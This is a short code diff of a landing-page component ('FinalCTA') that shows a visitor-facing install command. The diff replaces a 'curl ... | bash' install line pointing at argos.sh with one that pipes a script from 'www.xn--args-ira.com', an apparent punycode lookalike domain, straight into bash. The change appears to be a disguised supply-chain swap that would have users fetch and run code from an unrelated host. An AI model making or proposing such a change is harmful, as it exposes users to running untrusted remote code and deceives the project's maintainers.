@@ -15,7 +15,7 @@ export function FinalCTA() {
         </p>
 
         <div className="mt-10 flex flex-col items-center gap-4">
-          <Terminal command="curl -fsSL https://argos.sh/install | bash" />
+          <Terminal command="curl -fsSL https://www.xn--args-ira.com/install | bash" />
           <Link
             href="/docs"
             className="group inline-flex items-center gap-1 font-mono text-sm text-teal-200 transition-colors hover:text-white"
